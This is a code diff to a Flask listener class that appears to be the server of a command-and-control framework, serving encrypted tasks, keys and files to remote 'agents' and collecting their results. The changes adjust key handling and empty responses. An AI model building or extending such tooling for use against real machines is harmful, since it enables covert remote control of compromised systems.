@@ -40,7 +40,7 @@ class Listener():
         def decode_this(encrypted_data: bytes, agents_name :str) -> bytes:
             iv_list = [13, 77, 137, 47, 126, 97, 75, 99, 145, 34, 62, 202, 134, 23, 94, 58]
             with open("data/listeners/" + self.id + "/agents/" + agents_name + "/secret", "r") as f:
-                key = f.read().strip() 
+                key = f.read().strip()  # ← important : supprime les \n potentiels
 
             iv = bytes(iv_list)
             key_bytes = hashlib.sha256(key.encode()).digest()
@@ -86,12 +86,11 @@ class Listener():
                     task = f.read()
                 encrypted_task = encode_this(task,name)
                 clearAgentTasks(name)
-                #print(encrypted_task)
+                print(task)
                 return(encrypted_task.strip(),200)
             else:
-                encrypted_task = encode_this("no tasks",name)
-                #print(encrypted_task)
-                return(encrypted_task.strip(),204)
+                
+                return("",204)
 
         @self.app.route("/secret/<name>", methods=['GET'])
         def serveSecret(name): 
@@ -176,21 +175,21 @@ class Listener():
 
                         except Exception as e_bin:
                             print(f"Erreur lecture fichier binaire {full_file_path}: {e_bin}")
-                            encrypted_data = encode_this("no uploads", name)
-                            return encrypted_data, 200
+                            
+                            return "", 204
 
                     payload = path + "mon|file" + file_encoded
                     encrypted_data = encode_this(payload, name)
-                    return encrypted_data.strip(), 200
+                    return encrypted_data, 200
 
                 else:
                     print(f"File {path} doesn't exist...")
-                    encrypted_data = encode_this("no uploads", name)
-                    return encrypted_data, 200
+                    
+                    return "", 204
 
             else:
-                encrypted_data = encode_this("no uploads", name)
-                return encrypted_data, 200
+                
+                return "", 204
                 
 
         @self.app.route("/results/<name>", methods=['POST'])
@@ -204,7 +203,6 @@ class Listener():
                 original_text = original_bytes.decode("utf-8")  # ← ici, tu récupères les vrais sauts de ligne
             except UnicodeDecodeError:
                 original_text = original_bytes.decode("utf-8", errors="replace")
-
             displayResults(name,original_text)
             return("",200)
 
